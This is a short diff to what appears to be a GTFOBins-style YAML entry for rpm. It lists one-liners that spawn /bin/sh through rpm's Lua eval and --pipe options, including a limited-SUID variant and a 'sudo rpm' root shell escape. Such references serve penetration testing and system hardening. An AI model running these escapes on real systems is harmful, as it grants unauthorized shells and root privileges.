@@ -2,12 +2,9 @@
 functions:
   shell:
     - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
-  command:
-    - code: |
-            rpm --pipe '/bin/id > /tmp/result'
-            cat /tmp/result
+    - code: rpm --pipe '/bin/sh 0<&1'
   limited-suid:
-    - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
+    - code: ./rpm --eval '%{lua:os.execute("/bin/sh")}'
   sudo:
     - code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
     - description: |
